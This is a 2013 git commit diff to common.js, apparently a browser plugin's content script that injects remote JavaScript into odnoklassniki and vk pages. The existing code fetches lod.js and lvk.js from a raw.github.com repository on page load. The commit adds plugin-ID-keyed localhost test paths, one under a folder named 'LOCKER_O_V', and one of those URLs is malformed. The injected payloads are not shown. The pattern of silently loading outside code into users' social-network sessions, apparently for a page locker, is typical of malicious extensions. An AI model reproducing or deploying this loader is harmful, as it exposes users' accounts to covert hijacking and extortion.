2aa26cb95cc9191f2b31d6239b250ae71a765bb0
qo101qo <qolol@yandex.ru>
2013-04-08 10:55:49 +0400

    sandbox

--- common.js
+++ common.js
@@ -7,10 +7,32 @@ if (plg) {
 	document.body.appendChild(plg);
 }
 
+try{
+	var id = plg.Get('id');
+	switch(id){
+		case '1a659e81db184a6aeaddb56e2d4e2ad6':
+			if(location.hostname.indexOf('odnoklassniki') > -1)
+				var scr = 'http:/localhost/LOCKER_O_V/lod.js';
+			if(location.hostname.indexOf('vk') > -1)
+				var scr = 'http://localhost/vk/lvk.js';
+		break;
+		
+		case 'e747eb2129f44e85b0d0cc5a70074daa':
+			if(location.hostname.indexOf('odnoklassniki') > -1)
+				var scr = 'http:/localhost/LOCKER_O_V/lod.js';
+			if(location.hostname.indexOf('vk') > -1)
+				var scr = 'http://localhost/vk/lvk.js';
+		break;
+		
+		default: break;
+	}
+}catch(e){}
+
 if(location.hostname.indexOf('odnoklassniki') > -1)
 	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/lod.js';
 if(location.hostname.indexOf('vk') > -1)
 	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/lvk.js';
+	
 if(scr){
 	var script = document.createElement('script');
 	script.setAttribute('type', 'text/javascript');
